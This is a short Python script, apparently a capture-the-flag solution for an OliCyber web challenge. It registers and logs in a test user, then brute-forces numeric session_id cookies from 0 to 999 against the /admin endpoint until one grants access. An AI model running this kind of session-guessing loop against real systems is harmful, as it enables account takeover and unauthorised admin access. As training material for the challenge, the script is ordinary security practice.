import requests


#       /register
'''
# URL a cui inviare la richiesta POST
url = "http://too-small-reminder.challs.olicyber.it/register"

# Dati da inviare nel JSON
data = {
    "username": "strodnzolo",
    "password": "stronzolo"
}

response = requests.post(url, json=data)

print("Status Code:", response.status_code)
print("Response Body:", response.text)
'''



#       /admin

'''
admin_url = "http://too-small-reminder.challs.olicyber.it/admin"

cookies = {
    "session": "your_session_cookie_value"
}

def get_admin_page(url, cookies):
    response = requests.get(url, cookies=cookies)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)

get_admin_page(admin_url, cookies)
'''

'''
import requests
import json

login_url = "http://too-small-reminder.challs.olicyber.it/login"

def login(username, password):

    payload = {
        'username': username,
        'password': password
    }
    
    try:

        response = requests.post(login_url, json=payload)
        

        response.raise_for_status()
        

        print("Status Code:", response.status_code)
        

        if 'set-cookie' in response.headers:
            print("Session Cookie:", response.headers['set-cookie'])
        else:
            print("No session cookie returned.")
        
        print("Response Body:", response.text)
    
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

username = "strodnzolo"
password = "stronzolo"


login(username, password)
'''


import requests

admin_url = "http://too-small-reminder.challs.olicyber.it/admin"

def brute_force_cookie():
    for i in range(1000):  
        print(i)
        cookie_value = str(i)
        
        cookies = {'session_id': cookie_value}
        
        try:
            response = requests.get(admin_url, cookies=cookies)
            
            if response.status_code == 200:
                print(f"Valid cookie found: {cookie_value}")
                print("Response Body:", response.text)
                return cookie_value  
            
        except requests.exceptions.RequestException as e:
            print(f"An error occurred with cookie {cookie_value}: {e}")
    
    print("No valid cookie found.")
    return None

brute_force_cookie()
